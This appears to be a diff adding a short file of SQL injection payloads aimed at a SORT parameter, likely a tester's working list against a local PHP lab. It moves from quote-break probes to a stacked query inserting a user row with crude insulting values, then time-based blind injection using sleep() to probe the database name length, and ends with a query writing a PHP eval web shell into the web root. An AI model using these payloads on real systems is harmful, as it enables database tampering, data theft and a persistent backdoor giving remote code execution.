@@ -1,0 +1,16 @@
+SORT:1
+SORT:2
+SORT:2'
+SORT:2
+SORT:2; insert into users values(13,'chutia','chut') -- 
+SORT:2
+SORT:
+SORT:1
+SORT:1 and 1
+SORT:1 and 1'
+SORT:1' and 1'
+SORT:1 and -1
+SORT:1 and if((length(database())),sleep(1),1)
+SORT:1 and if((length(database()))>5,sleep(1),1)
+SORT:1 and if((length(database()))>5,sleep(1),1)
+SORT:1;select '<?PHP @eval($_POST["pass"]);?>' into outfile 'D:\\phpstudy\\PHPTutorial\\WWW\\x.php' ;
